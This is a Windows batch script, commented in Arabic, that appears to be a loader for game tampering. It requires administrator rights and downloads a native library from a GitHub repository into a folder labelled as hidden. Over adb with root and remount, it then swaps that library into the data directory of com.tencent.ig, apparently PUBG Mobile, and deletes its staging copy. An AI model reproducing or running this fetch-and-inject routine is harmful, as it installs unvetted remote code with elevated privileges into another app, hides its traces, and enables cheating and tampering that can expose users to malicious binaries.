@echo off
setlocal enabledelayedexpansion

:: تحديد مسار ملف redit.txt
set "reditFile=C:\Windows\System32\config\systemprofile\redit.txt"

:: التحقق مما إذا كان الملف موجودًا
if not exist "%reditFile%" (
    echo [ERROR] لم يتم العثور على ملف المسار: %reditFile%
    pause
    exit /b
)

:: قراءة مسار المحاكي من redit.txt
set /p gameLoopPath=<"%reditFile%"

:: التحقق مما إذا كان المسار صالحًا
if not exist "%gameLoopPath%" (
    echo [ERROR] المسار الذي تم قراءته غير موجود: %gameLoopPath%
    pause
    exit /b
)
cd /d "%gameLoopPath%"


:: التحقق من صلاحيات المسؤول
fltmc >nul 2>&1
if not %errorlevel%==0 (
    echo يرجى تشغيل هذا الملف كمسؤول.
    pause
    exit
)

:: تحديد المسار المخفي لحفظ الملف
set hiddenPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\SystemTools
if not exist "%hiddenPath%" mkdir "%hiddenPath%"

:: تحديد اسم الملف
set fileName=libGVoicePlugin.so

:: تحميل الملف باستخدام PowerShell
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/jack74512/UAO7/raw/refs/heads/main/%fileName%' -OutFile '%hiddenPath%\%fileName%'"

:: التحقق من نجاح التحميل
if not exist "%hiddenPath%\%fileName%" (
    echo فشل في تحميل الملف.
    exit /b
)

:: بدء أوامر ADB
adb kill-server
adb start-server
adb root
adb remount
adb push "%hiddenPath%\%fileName%" /data/local/tmp/
adb shell mv /data/local/tmp/%fileName% /data/data/com.tencent.ig/lib/

:: تنظيف المسار المخفي
if exist "%hiddenPath%\%fileName%" del "%hiddenPath%\%fileName%"

echo.
echo جميع الأوامر تم تنفيذها بنجاح!
pause
